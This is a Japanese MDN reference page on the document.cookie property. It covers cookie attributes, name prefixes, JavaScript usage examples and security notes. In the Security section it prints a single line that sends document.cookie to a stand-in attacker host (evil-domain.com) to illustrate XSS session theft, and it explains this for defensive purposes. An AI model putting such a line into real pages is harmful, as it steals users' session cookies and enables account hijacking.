---
title: "Document: cookie プロパティ"
short-title: cookie
slug: Web/API/Document/cookie
l10n:
  sourceCommit: ca26363fcc6fc861103d40ac0205e5c5b79eb2fa
---

{{APIRef("DOM")}}

{{domxref("Document")}} の `cookie` プロパティで、文書に関連付けられた[クッキー](/ja/docs/Web/HTTP/Guides/Cookies)を読み書きすることができます。
これは実際のクッキーの値に対するゲッターとセッターとして動作します。

> [!NOTE]
> `document.cookie` は同期型の API であるため、プロセス間でクッキーを読み込んだり I/O 操作を行ったりする際にメインスレッドをブロックしてしまうため、パフォーマンスの課題を引き起こす可能性があります。開発者は、可能であれば非同期 API である[クッキーストア API](/ja/docs/Web/API/Cookie_Store_API) を使用してクッキーを管理してください。

## 値

文字列で、セミコロンで区切られたクッキーのリストです (つまり `key=value` のペア)。
なお、それぞれのキーおよび値の周囲にはホワイトスペース（空白やタブ文字）をおくことができます。実際のところ、{{RFC(6265)}} ではそれぞれのセミコロンの後に空白 1 文字を入れることを必須としていますが、一部のユーザーエージェントはこれに従っていません。

また、このプロパティに `"key=value"` という形式の文字列を代入することで、設定または更新するクッキーを指定することもできます。なお、この方法を使用して一度に設定・更新できるクッキーは、1 つだけです。次のことも考慮してください。

- オプションとして次に挙げる値を設定することができます。 key と value のペアの後にセミコロンで区切って設定することで、クッキーを設定・更新することができます。
  - `;domain=ドメイン` (例えば、 `example.com` または `subdomain.example.com`): クッキーが送信されるホストです。
    指定されなければ、これは現在の文書の場所のホスト部分をデフォルトとし、クッキーはサブドメインでは利用できません。
    ドメインが指定されれば、サブドメインも常に含まれます。
    初期の仕様とは対照的に、ドメイン名の前のドットは無視されますが、ブラウザーはその様なドットを含むクッキーの設定を辞退することができます。

    > [!NOTE]
    > ドメインは JavaScript のオリジンと一致している必要があります。
    > 外部ドメインへのクッキーの設定は暗黙に無視されます。

  - `;expires=date-in-UTCString-format`: クッキーの期限です。もし `expires` も `max-age` も指定されていなければ、有効期限はセッションの終了までになります。

    > [!WARNING]
    > ユーザーのプライバシーを考慮するのであれば、ブラウザーの有効期限の管理に頼るのではなく、ウェブアプリの実装で指定した期間の経過後にクッキーを無効化することが重要です。
    > 多くのブラウザーはユーザーがクッキーを無期限に設定することができますが、これは安全ではありません。

    この値の形式については、{{jsxref("Date.toUTCString()")}} を参照してください。

  - `;max-age=max-age-in-seconds`: クッキーの秒単位の最大寿命です（例えば、1 年であれば `60*60*24*365` または 31536000）。

  - `;partitioned`: クッキーが分離されたストレージを使用して格納されることを示します。詳細は [Cookies Having Independent Partitioned State (CHIPS)](/ja/docs/Web/Privacy/Privacy_sandbox/Partitioned_cookies) を参照してください。

  - `;path=パス`: このクッキーの `Path` 属性の値です（詳しくは、[クッキーの送信先の定義](/ja/docs/Web/HTTP/Guides/Cookies#cookie_の送信先の定義)を参照してください）。

  - `;samesite`: {{httpheader("Set-Cookie")}} ヘッダーの `SameSite` 属性は、クッキーがいつ送られるかを指定するためにサーバーによって設定されることがあります。利用可能な値は `lax`、`strict`、`none` です（[`SameSite` によるサードパーティクッキーの制御](/ja/docs/Web/HTTP/Guides/Cookies#controlling_third-party_cookies_with_samesite)も参照してください）。
    - `lax` 値はすべての同一サイトリクエストと最上位のナビゲーション GET リクエストにクッキーを送信します。
      ユーザー追跡にはこれで十分ですが、多くの[クロスサイトリクエストフォージェリー](/ja/docs/Glossary/CSRF) (CSRF) 攻撃を防ぐことができます。
      これは現行ブラウザーでのデフォルト値です。
    - `strict` 値を指定すると、通常のリンクをたどる場合であっても、サイトをまたがるすべての閲覧コンテキストで、ブラウザーがクッキーを対象サイトに送信しないようにします。
    - `none` 値は、制限を適用しないことを明示する状態です。
      クッキーは、サイト間および同一サイト内のすべてのリクエストで送信されます。

  - `;secure`: クッキーが安全なプロトコルのみを介して送信されることを指定します。

- クッキーの値の文字列に {{jsxref("Global_Objects/encodeURIComponent", "encodeURIComponent()")}} を使用すると、文字列に (クッキーの値で許可されない) コンマ、セミコロン、ホワイトスペースを使用していないことを確認できます。
- クッキー名には、対応しているユーザーエージェントにおいて、そのクッキーの属性に特定の制限を課す接頭辞を付けることができます。すべてのクッキーの接頭辞は、二重アンダーバー (`__`) で始まり、ダッシュ (`-`) で終わります。定義されている接頭辞は以下の通りです。
  - **`__Secure-`**: `__Secure-` で始まる名前付きのクッキーは、保護されたページ (HTTPS) から `Secure` 属性をつけて設定しなければなりません。
  - **`__Host-`**: 名前が `__Host-` で始まるクッキーは、保護されたページ (HTTPS) から `Secure` 属性をつけて設定しなければなりません。さらに、これらのクッキーは `Domain` 属性を持っていてはならず、また `Path` 属性は `/` に設定する必要があります。これにより、そのようなクッキーは、それを設定したホストにのみ送信され、そのドメイン上の他のホストには送信されないことが保証されます。また、それらがホスト全体に設定され、そのホスト上のどのパスでも上書きされないことも保証されます。この組み合わせにより、オリジンをセキュリティ境界として扱うことに限りなく近いクッキーが実現されます。
  - **`__Http-`**: 名前が `__Http-` で始まるクッキーは、保護されたページ (HTTPS) から `Secure` 属性をつけて設定しなければならず、さらに `HttpOnly` 属性を設定して、`Set-Cookie` ヘッダーを介して設定されたことを証明する必要があります（これらは、`Document.cookie` や[クッキーストア API](/ja/docs/Web/API/Cookie_Store_API)を介して設定または変更することはできません）。
  - **`__Host-Http-`**: 名前が `__Host-Http-` で始まるクッキーは、保護されたページ (HTTPS) から `Secure` 属性をつけて設定しなければならず、さらに `HttpOnly` 属性を設定して、`Set-Cookie` ヘッダーを介して設定されたことを証明する必要があります。さらに、これらは `__Host-` で始まるクッキーと同じ制限も受けます。この組み合わせにより、オリジンをセキュリティ境界として扱うことに限りなく近いクッキーが実現されると同時に、その範囲が HTTP リクエストに限定されていることを開発者やサーバー管理者が確実に把握できるようになります。

  > [!NOTE]
  > ダッシュは接頭辞の一部とみなされます。

  > [!NOTE]
  > これらのフラグは `secure` 属性と一緒の場合のみ設定できます。

> [!NOTE]
> 上記のコードに見られるように、 `document.cookie` はネイティブの*セッター*及び*ゲッター*を持つ[アクセサープロパティ](/ja/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#解説)であり、値を持つ[データプロパティ](/ja/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#解説)では*ありません*。書き込んだものと読み込んだものは同じにはならず、常に JavaScript インタープリターに仲介されます。

## 例

### 例 1: 単純な使用方法

```html
<button id="show">クッキーを表示</button>
<button id="clear">クリア</button>
<div>
  <code id="cookie-value"></code>
</div>
```

```js
const showBtn = document.getElementById("show");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("cookie-value");

// この例では `SameSite=None;` を設定していますが、これはこの例が
// オリジンをまたいで動作する必要があるからです。
// `SameSite` 属性は設定しない方が一般的です。この場合、
// デフォルト値としてより安全な `SameSite=Lax;` の値が設定されます。
document.cookie = "name=Oeschger; SameSite=None; Secure";
document.cookie = "favorite_food=tripe; SameSite=None; Secure";

showBtn.addEventListener("click", () => {
  output.textContent = `> ${document.cookie}`;
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_1_Simple_usage', 200, 72)}}

### 例 2: test2 という名前のサンプルクッキーを取得

```html
<button id="show">クッキーの値を表示</button>
<button id="clear">クリア</button>
<div>
  <code id="cookie-value"></code>
</div>
```

```js
const showBtn = document.getElementById("show");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("cookie-value");

// この例では `SameSite=None;` を設定していますが、これはこの例が
// オリジンをまたいで動作する必要があるからです。
// `SameSite` 属性は設定しない方が一般的です。この場合、
// デフォルト値としてより安全な `SameSite=Lax;` の値が設定されます。
document.cookie = "test1=Hello; SameSite=None; Secure";
document.cookie = "test2=World; SameSite=None; Secure";

showBtn.addEventListener("click", () => {
  const cookieValue = document.cookie
    .split("; ")
    .find((row) => row.startsWith("test2="))
    ?.split("=")[1];
  output.textContent = `> ${cookieValue}`;
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_2_Get_a_sample_cookie_named_test2', 200, 72)}}

### 例 3: 一度だけ何かを行う

以下のコードを使用するためには、すべての `doSomethingOnlyOnce` の語 (クッキーの名前) が現れるところを専用の名前に置き換えてください。

```html
<button id="do-once">何かを一度だけ行う</button>
<button id="clear">クリア</button>
<div>
  <code id="output"></code>
</div>
```

```js
const doOnceBtn = document.getElementById("do-once");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

doOnceBtn.addEventListener("click", () => {
  if (
    !document.cookie
      .split("; ")
      .find((row) => row.startsWith("doSomethingOnlyOnce"))
  ) {
    // この例では `SameSite=None;` を設定しますが、これはこの例が
    // オリジン間で動作する必要があるからです。
    // `SameSite` 属性は設定しない方が一般的です。この場合、
    // デフォルト値としてより安全な `SameSite=Lax;` の値が設定されます。
    document.cookie =
      "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; SameSite=None; Secure";

    output.textContent = "> ここで何かを行います。";
  }
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_3_Do_something_only_once', 200, 72)}}

### 例 4: 前回のクッキーをリセット

```html
<button id="reset">一度だけのクッキーをリセット</button>
<button id="clear">クリア</button>
<div>
  <code id="output"></code>
</div>
```

```js
const resetBtn = document.getElementById("reset");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

resetBtn.addEventListener("click", () => {
  // この例では `SameSite=None;` を設定しますが、これはこの例が
  // オリジン間で動作する必要があるからです。
  // `SameSite` 属性は設定しない方が一般的です。この場合、
  // デフォルト値としてより安全な `SameSite=Lax;` の値が設定されます。
  document.cookie =
    "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=None; Secure";

  const output = document.getElementById("reset-once");
  output.textContent = "> リセット!";
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_4_Reset_the_previous_cookie', 200, 72)}}

### 例 5: クッキーの存在をチェック

```html
<button id="check">クッキーが存在するかをチェック</button>
<button id="clear">クリア</button>
<div>
  <code id="output"></code>
</div>
```

```js
const checkBtn = document.getElementById("check");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

// この例では `SameSite=None;` を設定しますが、これはこの例が
// オリジン間で動作する必要があるからです。
// `SameSite` 属性は設定しない方が一般的です。この場合、
// デフォルト値としてより安全な `SameSite=Lax;` の値が設定されます。
document.cookie = "reader=1; SameSite=None; Secure";

checkBtn.addEventListener("click", () => {
  if (
    document.cookie.split(";").some((item) => item.trim().startsWith("reader="))
  ) {
    output.textContent = '> クッキー "reader" があります';
  } else {
    output.textContent = '> クッキー "reader" がありません';
  }
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_5_Check_a_cookie_existence', 200, 72)}}

### 例 6: クッキーが特定の値を持っていることをチェック

```html
<button id="check">
  クッキーが特定の値を持っていることをチェック
</button>
<button id="clear">クリア</button>

<div>
  <code id="output"></code>
</div>
```

```js
const checkBtn = document.getElementById("check");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

checkBtn.addEventListener("click", () => {
  if (document.cookie.split(";").some((item) => item.includes("reader=1"))) {
    output.textContent = '> クッキー "reader" には値 "1" があります';
  }
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_6_Check_that_a_cookie_has_a_specific_value', 200, 72)}}

## セキュリティ

`path` 属性は、異なるパスによる認証されていないクッキーの読み込みから守ってくれ*ない*ということに注意することが重要です。
これはシンプルな DOM で簡単にバイパスできます (たとえば、クッキーのパスとともに隠し {{HTMLElement("iframe")}} 要素を生成して、この iframe の `contentDocument.cookie` プロパティにアクセスします)。
クッキーのアクセスを守る唯一の方法は、異なるドメインやサブドメインを使うことで、[同一オリジンポリシー](/ja/docs/Web/Security/Defenses/Same-origin_policy)を適用することです。

クッキーは普段、ウェブアプリケーションでユーザーと認証されたセッションを識別するために使われます。
そこで、ウェブアプリケーションからのクッキーを盗まれると、認証されたユーザーのセッションハイジャックにつながります。
クッキーを盗むための一般的な方法は、[ソーシャルエンジニアリング](https://ja.wikipedia.org/wiki/ソーシャル・エンジニアリング)を使用するか、アプリケーション内の[クロスサイトスクリプティング](/ja/docs/Glossary/Cross-site_scripting) (XSS) 脆弱性の悪用です。

```js
new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
```

`HTTPOnly` クッキー属性は、 JavaScript からのクッキー値へのアクセスを防止することで、この攻撃を軽減することに役立ちます。より詳細情報は [Cookies and Security](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/) を見てください。

## メモ

- Firefox 2 から、より良いクライアント側ストレージの機構を利用できます。 - [WHATWG DOM ストレージ](/ja/docs/Web/API/Web_Storage_API)です。
- 有効期限を 0 に更新するだけで、クッキーを削除できます。
- クッキーを持てば持つほど、サーバーとクライアント間の通信で、より多くのデータが送信されることを忘れないでください。
  これはリクエストを遅くします。
  もし、クライアントだけにデータを持たせ続けたいなら、 [WHATWG DOM ストレージ](/ja/docs/Web/API/Web_Storage_API) を使うことを強くお勧めします。
- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965) (5.3 章, "Implementation Limits") は、クッキーのキーまたは値の長さについて**最大長を設けない**よう指定しており、 **arbitrarily large cookies** への対応を実装するよう勧めています。
  各ブラウザーの実装では最大値は異なっている可能性があるので、それぞれのブラウザーのドキュメントを参照してください。

`document.cookie` アクセサープロパティの取得と設定の間に非対称性が生じる理由は、クッキーがクライアント・サーバー型の性質を持つためです。これは、それ以外のクライアント間ストレージ方式（例えば、[localStorage](/ja/docs/Web/API/Web_Storage_API) など）とは異なります。

- サーバーがクライアントにクッキーを格納するよう指示します。

  ```http
  HTTP/1.0 200 OK
  Content-type: text/html
  Set-Cookie: cookie_name1=cookie_value1
  Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT

  [content of the page here]
  ```

- クライアントが以前格納されたクッキーをサーバーに送り返します。

  ```http
  GET /sample_page.html HTTP/1.1
  Host: www.example.org
  Cookie: cookie_name1=cookie_value1; cookie_name2=cookie_value2
  Accept: */*
  ```

## 仕様書

{{Specifications}}

## ブラウザーの互換性

{{Compat}}

## 関連情報

- [HTTP Cookie](/ja/docs/Web/HTTP/Guides/Cookies)
- [DOM ストレージ](/ja/docs/Web/API/Web_Storage_API)
- [`URL.pathname`](/ja/docs/Web/API/URL/pathname)
- {{jsxref("Date.toUTCString()")}}
- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965)
